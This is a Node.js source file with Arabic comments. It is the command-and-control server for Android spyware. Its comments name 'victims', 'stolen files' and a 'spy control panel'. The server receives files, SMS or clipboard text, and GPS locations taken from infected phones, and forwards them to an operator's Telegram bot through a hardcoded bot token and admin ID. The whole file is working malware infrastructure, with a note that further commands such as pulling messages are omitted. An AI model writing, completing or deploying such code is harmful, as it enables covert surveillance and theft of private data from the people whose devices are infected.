const express = require("express");
const webSocket = require("ws");
const http = require("http");
const telegramBot = require("node-telegram-bot-api");
const { v4: uuidv4 } = require("uuid");
const multer = require("multer");
const bodyParser = require("body-parser");
const axios = require("axios");

// بيانات المهاجم
const botToken = '8226340055:AAFtj-gFVTMxx9PyEgl48F6kE1SSa92taDY';
const adminId = '5570615802';
const keepAliveAddress = 'https://www.google.com';

const app = express();
const server = http.createServer(app);
const socketServer = new webSocket.Server({ server: server });
const bot = new telegramBot(botToken, { polling: true });
const connectedClients = new Map();
const upload = multer();

app.use(bodyParser.json());

let selectedUuid = "";
let tempNumber = "";
let tempTitle = "";

// الصفحة الرئيسية للخادم
app.get("/", (req, res) => {
    res.send("<h1 align=\"center\">Server Status: Running ✅</h1>");
});

// استقبال الملفات المسروقة من الجهاز
app.post("/uploadFile", upload.single("file"), (req, res) => {
    const fileName = req.file.originalname;
    bot.sendDocument(adminId, req.file.buffer, {
        caption: `°• ملف مستخرج من جهاز: <b>${req.headers.model}</b>`,
        parse_mode: "HTML"
    }, { filename: fileName, contentType: "application/txt" });
    res.send("");
});

// استقبال النصوص (مثل سجلات الـ SMS أو الكليب بورد)
app.post("/uploadText", (req, res) => {
    bot.sendMessage(adminId, `°• نص مستخرج من جهاز: <b>${req.headers.model}</b>\n\n` + req.body.text, { parse_mode: "HTML" });
    res.send("");
});

// استقبال الموقع الجغرافي
app.post("/uploadLocation", (req, res) => {
    bot.sendLocation(adminId, req.body.lat, req.body.lon);
    bot.sendMessage(adminId, `°• موقع الجهاز: <b>${req.headers.model}</b>`, { parse_mode: "HTML" });
    res.send("");
});

// إدارة اتصالات الـ WebSocket مع الضحايا
socketServer.on("connection", (socket, req) => {
    const deviceUuid = uuidv4();
    const deviceModel = req.headers.model;
    const batteryLevel = req.headers.battery;
    const androidVersion = req.headers.version;
    const screenBrightness = req.headers.brightness;
    const providerName = req.headers.provider;

    socket.uuid = deviceUuid;
    connectedClients.set(deviceUuid, { 
        model: deviceModel, 
        battery: batteryLevel, 
        version: androidVersion, 
        brightness: screenBrightness, 
        provider: providerName 
    });

    // إشعار بوت التليجرام عند دخول ضحية جديدة
    bot.sendMessage(adminId, `°• تم تسجيل دخول جهاز جديد 🌐\n\n• Device Model: <b>${deviceModel}</b>\n• Battery: <b>${batteryLevel}%</b>\n• Android Version: <b>${androidVersion}</b>\n• Provider: <b>${providerName}</b>`, { parse_mode: "HTML" });

    socket.on("close", () => {
        bot.sendMessage(adminId, `°• انقطع اتصال الجهاز 🔴\n\n• Device Model: <b>${deviceModel}</b>`, { parse_mode: "HTML" });
        connectedClients.delete(socket.uuid);
    });
});

// معالجة الأوامر من بوت التليجرام
bot.on("message", (msg) => {
    const chatId = msg.chat.id;
    if (chatId == adminId) {
        if (msg.text == "/start") {
            bot.sendMessage(adminId, "°• أهلاً بك في لوحة تحكم التجسس •°\n\nاستخدم القائمة أدناه للتحكم بالأجهزة المتصلة.", {
                reply_markup: {
                    keyboard: [["الأجهزة المتصلة 📱"], ["الأوامر 🕹"]],
                    resize_keyboard: true
                }
            });
        }

        if (msg.text == "الأجهزة المتصلة 📱") {
            if (connectedClients.size == 0) {
                bot.sendMessage(adminId, "لا توجد أجهزة متصلة حالياً.");
            } else {
                let list = "قائمة الأجهزة المتصلة:\n\n";
                connectedClients.forEach((info, uuid) => {
                    list += `• <b>${info.model}</b> (${info.battery}%) | ID: <code>${uuid}</code>\n`;
                });
                bot.sendMessage(adminId, list, { parse_mode: "HTML" });
            }
        }
        // ... (تكملة معالجة الأوامر الأخرى مثل سحب الرسائل والموقع)
    }
});

// تشغيل الخادم
const PORT = process.env.PORT || 8999;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
